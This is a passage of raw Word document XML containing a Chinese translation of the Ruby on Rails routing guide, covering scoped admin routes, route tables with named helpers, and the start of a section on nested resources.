            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A8B84DE"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15751244"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="474A7778"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named helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1F931DC3" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="470A4F6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71962BA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/admin/posts </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2915160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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28FA261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admin_posts_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="12EA6D7F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69E9958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411A7E7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/admin/posts/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3073537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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5355855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new_admin_post_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4E36E965" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46776EC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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EE10F9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/admin/posts </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B1F40F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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="090CE19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admin_posts_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="56EE1F90" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BA4A07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65AD71E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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49F6FE2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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2382406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admin_post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="263CC56E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="083DB73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42AACC5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/admin/posts/:id/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D6EF0A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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="141289C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edit_admin_post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="56E5AF3A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="046EC58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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="289CD19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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2320756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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F43CB9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admin_post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="29A732B2" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4480225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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02B1DDB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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C92755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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19AD551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admin_post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E50A57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如果你想要把路由 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (不以 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/admin</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作前缀) 匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Admin::PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，你就需要这样了：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="617CA3C5" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46E9898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scope :module</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin"</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084E913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:posts, :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4926685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05A3AD3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或者对单个 Resource 匹配的时候</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3C862B4B" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7337BE23" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2093041248"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :posts, :module</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0237A95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而你如果想要把路由：</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/admin/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (控制器中没有 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Admin::</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个模块作为前缀)，你可以用</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5476443A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C6891A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scope "/admin"</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42A870B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:posts, :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52F9CE9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58243DB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或者在为单个 Resource 匹配的时候这么写：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="652C5890" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01604464" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1032733070"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :posts, :path</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "/admin/posts"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="714E7AE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在这些例子里面，可以发现 scope 并不会改变 routes 的生成的路径名称的（译者注：named routes，这里指的是生成的Helper的名称。） ，例如在最后一个例子里面，会生成匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的规则:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2736"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="2496"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="66879169" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6ACDFF7A"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7BCEEC6B"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C50C3E0"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51773DB8"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named helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="67FE0638" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79E2539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7AAEB28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/admin/posts </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B03047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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DCEF79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posts_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="56E2BB6B" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1741776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458F455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/admin/posts/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24643C6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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="346D0EE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new_post_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="245ADEF0" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="533CD47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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FB0600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/admin/posts </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C5FE0B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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="553D1BA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posts_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6F6E3800" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D276E0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7CB528B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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CE8897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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0FEF6E7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post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="583C47C1" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7267579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019895A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/admin/posts/:id/edit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55B2C28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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45DD5CC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edit_post_path(:id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="75DE519D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B99A9A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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="710F47A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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="723C005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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02E7135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post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7E915BF9" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CEDDFC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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CAEF43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/admin/posts/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EDBC5D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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="304267B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post_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29825BC4"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2.7 嵌套(Nested)数组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09072ED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通常，一个 Resource 常常有数个逻辑上的子 Resource 。例如，你的应用有这样一个模型：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6FB4022D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="739DCB1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Magazine &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0786414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has_many :ads</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4481F7C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p w14:paraId="490AC09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3C8A548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Ad &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21D91DA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belongs_to :magazine</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21525C8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67C46A7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Nested routes allow you to capture this relationship in your routing. In this case, you could include this route declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2976"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="198F5B63" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7535234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resources :magazines</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1297690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:ads</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55A4424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2BB1A44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在这里，对于每一个 magazines 的路径下面都需要能够有 ad 作为 Resource 匹配到</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
